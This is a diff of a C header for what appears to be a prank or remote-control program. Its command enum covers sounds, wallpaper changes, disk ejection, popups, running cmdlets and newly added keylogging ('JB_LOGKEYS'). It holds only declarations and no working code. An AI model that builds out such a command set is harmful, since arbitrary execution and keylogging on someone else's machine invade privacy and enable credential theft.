@@ -11,9 +11,7 @@ typedef enum {
 
     /* --- Sounds --- */
     JB_VOLUME,
-    JB_SZAMBO,      
-    // ... //
-    JB_SCREAM,
+    JB_SZAMBO, // pay sound
 
     /* --- Wallpaper --- */
     JB_SETWALL,
@@ -23,17 +21,16 @@ typedef enum {
     /* --- Shortcuts --- */
     JB_CREATELINKS,
     JB_REMOVELINKS,
-    JB_OPENWEB,
 
     /* --- Other --- */
+    JB_OPENWEB,     // Open website in default browser
     JB_CDEJECT,     // Eject disk drive
     JB_POPUPW,      // MessageBoxW
     JB_POPUPA,      // MessageBoxA
     JB_EXEC,        // execute a cmdlet
     JB_ROTATESCR,   // SetDisplayAutoRotationPreferences
     JB_CHANGERES,   
-
-    JB_SENDKEY      // ?
+    JB_LOGKEYS      // keylogging bruh.   
 } JB_Instruction;
 
 typedef struct {
@@ -45,6 +42,5 @@ typedef struct {
 //WINBOOL changeWallpaper(char *path);  // I think we don't need to expose it
 
 void execCommand(JBCMD cmd);
-void sendError(const char *message);
 
 #endif
